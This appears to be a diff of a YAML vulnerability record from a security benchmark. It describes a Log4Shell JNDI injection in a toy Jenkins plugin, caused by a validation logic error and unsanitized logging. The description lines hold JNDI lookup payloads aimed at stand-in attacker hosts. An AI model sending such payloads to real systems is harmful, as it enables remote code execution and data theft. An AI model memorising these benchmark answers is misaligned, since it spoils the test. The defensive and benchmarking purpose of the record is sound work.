@@ -1,6 +1,14 @@
 id: cpv_6
 
-name: JNDI Injection via Logic Flaw in Input Validation (Log4Shell)
+name: Logic Error Enabling Log4Shell JNDI Injection
+
+origin: 1-day
+
+release_date: 12/10/2021
+
+references:
+- https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+- https://github.com/advisories/GHSA-jfh8-c2jp-5v3q
 
 cwes:
 - CWE-917
@@ -8,22 +16,27 @@ cwes:
 - CWE-20
 
 description: |
-  This is a critical JNDI Injection vulnerability (Log4Shell - CVE-2021-44228) in the 
-  Jenkins Toy Plugin's StateMonitor class. The vulnerability consists of two compounding 
-  issues: (1) A logic flaw in the validation code uses AND (&&) instead of OR (||) when 
-  checking if name and password match the allowed pattern, allowing an attacker to bypass 
-  validation by providing a valid name while injecting malicious content in the password 
-  parameter. (2) The bypassed password value is passed unsanitized to logger.error() at 
-  line 58. Since the plugin uses Apache Log4j version 2.14.1, which is vulnerable to 
-  CVE-2021-44228, the logger performs JNDI lookups when encountering strings like 
-  ${jndi:ldap://attacker.com/}. An attacker can send a POST request with name=admin and 
-  password=${jndi:ldap://g.co/} to trigger a JNDI lookup to an attacker-controlled server, 
-  leading to Remote Code Execution (RCE), data exfiltration, and complete system compromise.
+  A combination of two flaws enables a Log4Shell-style JNDI injection attack.
+  First, a logic error in input validation at lines 45-46 uses AND (&&) instead
+  of OR (||), allowing an attacker to bypass validation by providing a valid
+  name with a malicious password. Second, the unsanitized password is logged
+  directly at line 58 using logger.error(), which triggers Log4j2 to evaluate
+  JNDI lookup expressions like ${jndi:ldap://attacker.com/evil}. This enables
+  remote code execution or data exfiltration via the Log4Shell vulnerability
+  (CVE-2021-44228).
 
 locations:
-- path_from_root: plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/StateMonitor.java
+- type: root_cause
+  path_from_root: plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/StateMonitor.java
   function_name: doCheck
-  startLine: 48
-  startColumn: 0
+  startLine: 45
+  startColumn: 9
+  endLine: 46
+  endColumn: 33
+- type: crash_site
+  path_from_root: plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/StateMonitor.java
+  function_name: doCheck
+  startLine: 58
+  startColumn: 17
   endLine: 58
-  endColumn: 0
+  endColumn: 39
